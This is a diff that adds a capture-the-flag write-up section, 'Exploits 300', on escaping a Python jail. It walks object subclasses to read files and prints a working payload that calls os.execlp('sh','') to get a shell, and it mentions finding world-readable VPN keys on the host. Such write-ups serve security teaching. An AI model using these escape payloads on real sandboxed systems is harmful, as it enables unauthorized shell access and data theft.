@@ -183,3 +183,63 @@ Then, we test the strings `'baaaaaaaaaaa'`, `'caaaaaaaaaaa'`, and so on until we
 	print a
 
 The password we extracted by this method was `S@nd_will2z0`, and providing this as the password returns the flag `Time_works_for_you`. Perhaps a timing attack was the intended solution?
+
+Exploits 300
+------------
+
+We're challenged to escape a jail, and a few first submissions return Python-style errors. 
+
+Apart from missing builtins, there appear to be no restrictions on input characters, so we don't need any encoding tricks. 
+
+In a local interpreter I tried to find a reference to `os` so I could open a shell. We can start by listing the subclasses of `object`:
+
+	>>> object.__subclasses__()
+	[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
+
+To reach `object` in the challenge, it was necessary to follow the class hierarchy from any object, like a number or tuple. We can instantiate a file object and read it:
+
+	>>> ().__class__.__bases__[0].__subclasses__()[40]
+	<type 'file'>
+	>>> ().__class__.__bases__[0].__subclasses__()[40]('filename.txt','r').read()
+
+Then, we tried reading `flag`, `key`, `flag.txt` and so on, none of which were found. Then, we noticed that we had an absolute path to `exploit300.py` (`/home/john/exploit300.py`) in the traceback when EOF is sent. So, we read that absolute path and retrieved the script, included farther below. As suspected, though the builtins are empty, there are no restrictions on input. Now we need to get a shell. [Eindbazen's pCTF pyjail solution](http://eindbazen.net/2013/04/pctf-2013-pyjail-misc-400/) used the same trick to get a list of classes, and then indexed into it to traverse to the `os` module: 
+
+	().__class__.__bases__[0].__subclasses__()[48].__init__.__globals__['linecache'].os.execlp('sh','')
+
+However, this was running in a different Python environment, so it wasn't clear what the class at index 48 was supposed to be. I checked a few numbers around it and found that 52, `warningmessage`, worked.
+
+	().__class__.__bases__[0].__subclasses__()[52].__init__.__globals__['linecache'].os.execlp('sh','')
+
+Now we had a shell, and in the root directory, which is why `flag.txt` was not found. The flag was located at `/home/john/flag.txt`. We should have checked that path earlier.
+
+Having solved the problem, we explored the system a bit and found some world-readable VPN configuration files and client keys(!) in `/ov/oooooo`. We also discovered that flag.txt and exploit300.py were writable by the `john` user. Though tempting, we didn't modify either. In short, this wasn't much of a sandbox.
+
+When trying to find the pyjail solution we referenced, we came across a writeup for picoCTF's Python Eval 5, and discovered that this problem was identical down to the indentation style, apart from a comment, the prompt text, and the allowed length:
+
+	#!/usr/bin/python -u                            | from sys import modules
+	# task5.py                                      | modules.clear()
+	# A real challenge for those python masters out | del modules
+	                                                |
+	from sys import modules                         | _raw_input = raw_input
+	modules.clear()                                 | _BaseException = BaseException
+	del modules                                     | _EOFError = EOFError
+	                                                |
+	_raw_input = raw_input                          | # he-he
+	_BaseException = BaseException                  | __builtins__.__dict__.clear()
+	_EOFError = EOFError                            | __builtins__ = None
+	                                                |
+	__builtins__.__dict__.clear()                   | print '>>> Just escape me...'
+	__builtins__ = None                             |
+	                                                | while 1:
+	print 'Get a shell, if you can...'              |   try:
+	                                                |     d = {'x':None}
+	while 1:                                        |     exec 'x='+_raw_input()[:500] in d
+	  try:                                          |     print 'ret:', d['x']
+	    d = {'x':None}                              |   except _EOFError, e:
+	    exec 'x='+_raw_input()[:50] in d            |     raise e
+	    print 'Return Value:', d['x']               |   except _BaseException, e:
+	  except _EOFError, e:                          /     print 'Exception:', e
+	    raise e                                     <
+	  except _BaseException, e:                     <
+	    print 'Exception:', e                       <
+
